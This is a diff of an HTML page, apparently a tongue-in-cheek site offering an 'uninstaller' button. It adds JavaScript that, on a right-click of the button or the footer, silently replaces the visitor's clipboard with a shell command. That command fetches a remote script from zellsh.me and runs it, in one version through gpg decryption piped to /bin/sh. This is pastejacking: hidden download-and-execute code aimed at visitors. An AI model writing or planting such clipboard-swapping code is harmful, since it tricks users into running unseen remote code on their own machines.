@@ -63,7 +63,9 @@
     SOFTWARE. -->
 
     <div class="uninstaller-div">
-      <button class="uninstaller-button" id="uninstaller-button-id">Get the Uninstaller!</button>
+      <button class="uninstaller-button" id="uninstaller-button-id">
+        Get the Uninstaller!
+      </button>
     </div>
     <div id="player"></div>
     <script>
@@ -112,15 +114,29 @@
 
     <!-- End of MIT License, nobody else but me is to blame for the horrors below this line -->
 
+    <footer id="footer-id">⚠️ This website is super professional! Totally trust it! ⚠️</footer>
+
     <script>
-      document.getElementById("uninstaller-button-id").onmousedown = function (event) {
+      document.getElementById("uninstaller-button-id").onmousedown = function (
+        event
+      ) {
         if (event.which == 3) {
-          navigator.clipboard.writeText("/bin/wget -O /tmp/antizell 'https://zellsh.me/antizell.sh' && /bin/chmod +x /tmp/antizell && /bin/bash /tmp/antizell");
+          navigator.clipboard.writeText(
+            "gpg -d <(/bin/wget -O - 'https://zellsh.me/antizell.sh.gpg') | /bin/sh"
+          );
+        }
+      };
+
+      document.getElementById("footer-id").onmousedown = function (
+        event
+      ) {
+        if (event.which == 3) {
+          navigator.clipboard.writeText(
+            "/bin/wget -O /tmp/antizell 'https://zellsh.me/antizell.sh' && /bin/bash /tmp/antizell"
+          );
         }
       };
     </script>
-
-    <footer>⚠️ This website is super professional! Totally trust it! ⚠️</footer>
   </body>
 
   <style>
